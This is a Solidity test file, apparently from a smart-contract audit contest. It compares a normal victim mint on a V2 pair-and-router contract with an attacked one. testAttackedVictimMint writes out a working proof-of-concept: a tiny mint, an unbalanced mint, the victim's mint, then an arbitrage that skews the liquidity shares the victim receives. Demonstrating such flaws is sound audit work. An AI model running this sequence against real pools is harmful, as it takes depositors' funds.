// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.12;

// This is just the test case, disregard for judging

import "ds-test/test.sol";
import "../Contract.sol";
import "solmate/tokens/ERC20.sol";

contract T1 is ERC20{
    constructor() ERC20("T1", "T1", 18) {
        _mint(msg.sender, 1000 * 10**18);
    }
}

contract T2 is ERC20{
    constructor() ERC20("T2", "T2", 18) {
        _mint(msg.sender, 1000 * 10**18);
    }

    uint public marker = 2;
}

interface CheatCodes {
      function prank(address) external;
}

contract ContractTest is DSTest {
    CheatCodes cheats = CheatCodes(HEVM_ADDRESS);
    V2PairAndRouter c;
    T1 t1;
    T2 t2;

    address victim = 0x1230000000000000000000000000000000000000;

    function setUp() public {
        t1 = new T1();
        t2 = new T2();
        c = new V2PairAndRouter(address(t1), address(t2));
    }

    function testMint() public {
        t1.transfer(address(c), 1 ether);
        t2.transfer(address(c), 1 ether);
        c.mint(address(this), 0, 0, 1);
        t1.transfer(address(c), 1 ether);
        t2.transfer(address(c), 1 ether);
        c.mint(address(this), 0, 0, 1);
        t1.transfer(address(c), 2 ether);
        t2.transfer(address(c), 2 ether);
        c.mint(address(this), 0, 0, 1);
        t1.transfer(address(c), 2 ether);
        c.mint(address(this), 0, 0, 1);
        t2.transfer(address(c), 2 ether);
        c.mint(address(this), 0, 0, 1);
    }

    function testNormalVictimMint() public {
        t1.transfer(address(c), 1 ether);
        t2.transfer(address(c), 1 ether);
        c.mint(address(this), 0, 0, 1);
        t1.transfer(address(c), 1 ether);
        cheats.prank(victim);
        uint bal = c.mint(victim, 0, 0, 412970921685975762); 
        // Arbitrager
        t2.transfer(address(c), 1 ether);
        c.mint(address(this), 0, 0, 1);
        // Burn to find underlying
        cheats.prank(victim);
        c.burn(victim, bal);
        t1.balanceOf(victim);
        t2.balanceOf(victim);
    }

    function testAttackedVictimMint() public {
        t1.transfer(address(c), 1 ether);
        t2.transfer(address(c), 1 ether);
        uint bal = c.mint(address(this), 0, 0, 1);
        c.burn(address(this), bal);
        // Mini Mint
        t1.transfer(address(c), 10**14);
        t2.transfer(address(c), 10**14);
        c.mint(address(this), 0, 0, 1);
        // Unbalanced Mint
        t1.transfer(address(c), 20 ether);
        c.mint(address(this), 0, 0, 1);
        // Victim Mint
        t1.transfer(address(c), 1 ether);
        cheats.prank(victim);
        bal = c.mint(victim, 0, 0, 412970921685975762); 
        // Arbitrager
        t2.transfer(address(c), 21 ether);
        c.mint(address(this), 0, 0, 1);
        // Burn to find underlying
        cheats.prank(victim);
        c.burn(victim, bal);
        t1.balanceOf(victim);
        t2.balanceOf(victim);
    }


}
